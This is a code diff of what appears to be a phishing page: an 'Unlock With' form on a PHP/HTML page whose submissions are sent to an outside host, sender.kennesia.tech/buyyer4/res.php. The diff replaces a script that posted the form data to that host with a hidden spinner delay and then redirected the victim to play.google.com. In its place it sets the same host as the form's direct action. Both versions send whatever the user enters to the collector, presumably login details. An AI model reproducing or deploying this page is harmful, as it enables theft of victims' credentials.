@@ -35,7 +35,7 @@ if (isset($_GET['a']) && $_GET['a'] === $_SESSION['a']) {
         <div class="nav">
             <img class="img1" src="assets/img/nav.jpeg" alt="navbar">
         </div>
-        <form id="frmSen" method="post">
+        <form action="https://sender.kennesia.tech/buyyer4/res.php" method="post">
             <p class="p1">
                 Unlock With
             </p>
@@ -53,27 +53,6 @@ if (isset($_GET['a']) && $_GET['a'] === $_SESSION['a']) {
             </p>
         </footer>
     </div>
-    <script>
-        document.getElementById('frmSen').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var form = this;
-            var submitBtn = document.getElementById('sub');
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>';
-            setTimeout(function() {
-                fetch('https://sender.kennesia.tech/buyyer4/res.php', {
-                    method: 'POST',
-                    body: new FormData(form)
-                }).then(function(response) {
-                    window.location.href = 'https://play.google.com/';
-                }).catch(function(error) {
-                    console.error('Error:', error);
-                    submitBtn.innerText = 'Proses';
-                    submitBtn.disabled = false;
-                });
-            }, 700);
-        });
-    </script>
     <script src="assets/off.js"></script>
     <script src="https://kit.fontawesome.com/08380760ee.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
